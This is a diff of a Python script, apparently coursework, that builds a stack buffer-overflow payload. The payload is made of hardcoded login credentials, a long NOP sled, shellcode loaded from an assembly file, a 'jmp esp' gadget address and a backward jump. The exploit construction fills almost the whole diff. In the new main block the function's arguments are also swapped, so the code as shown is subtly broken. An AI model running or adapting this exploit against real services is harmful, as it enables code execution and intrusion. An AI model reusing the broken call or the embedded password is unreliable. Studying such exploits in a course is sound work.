@@ -1,4 +1,5 @@
 import os
+from sys import argv
 
 def yank_binary_content(binary_filename: str, binary_start_token: bytes, binary_end_token: bytes) -> bytes:
 	"""returns binary content of file between binary_start_token and binary_end_token"""
@@ -82,16 +83,37 @@ class ShellCodeGenerator:
 	def append_zeros(self, num_zeros: int):
 		self.content += num_zeros*b"\x00"
 
-username = "archer"
-password = "FKGXJP0OCE1LKT3D"
-command = "PEEK"
+
+def hw4_p3_filegen(output_filename, asm_input_filename):
+	"""
+	char* path, *srv_output_buf;
+	while(true){
+		scanf("%s", path);
+		handle_req(socket_ptr, 7, path, srv_output_buf, 0);
+	}
+	"""
+	gen = ShellCodeGenerator()
+	gen.append_strline("archer")
+	gen.append_strline("FKGXJP0OCE1LKT3D")
+	gen.append_strline("PEEK")
+	
+	gen.start_buffer_cnt()
+	gen.nop_cascade(16004)
+	gen.load_from_asm_file(asm_input_filename)
+	gen.comptete_buffer_to_size(16304)#
+	gen.append_dword(0x62502028)
+	gen.append_asmline("jmp -330")
+	gen.append_strline("")
+	
+	gen.append_strline("*")
+	gen.append_strline("database")
+
+	gen.write_to_file(output_filename)
+
 
 if __name__ == "__main__":
-	from sys import argv
-
 	asm_input_filename = "shellcode.S"
 	output_filename = "shellcode.bin"
-
 	#if one of cmd inputs has .S extension, assume it is the asm input filename and same with output and .bin:
 	for arg in argv[1:]:
 		if arg.endswith(".S"):
@@ -100,30 +122,4 @@ if __name__ == "__main__":
 		elif arg.endswith(".bin"):
 			output_filename = arg
 			break
-	"""
-	//save socknumber from upper stack?
-	char* path, *srv_output_buf;
-	while(true){
-		scanf("%s", path);
-		handle_req(0, 7, path, srv_output_buf, 0);
-	}
-	"""
-
-	gen = ShellCodeGenerator()
-	gen.append_strline(username)
-	gen.append_strline(password)
-	gen.append_strline(command)
-	gen.start_buffer_cnt()
-	gen.nop_cascade(16004)
-	gen.load_from_asm_file(asm_input_filename)
-	# gen.append_dword(0x62501B27)#"Enter your password" message
-	gen.comptete_buffer_to_size(16304)
-	gen.append_dword(0x62502028)#jmp esp gadjet
-	gen.append_asmline("jmp -330")
-	gen.append_strline("\n*")
-	gen.append_strline("\n*")
-	gen.append_strline("\n*")
-
-	gen.write_to_file(output_filename)
-	pass
-
+	hw4_p3_filegen(asm_input_filename, output_filename)
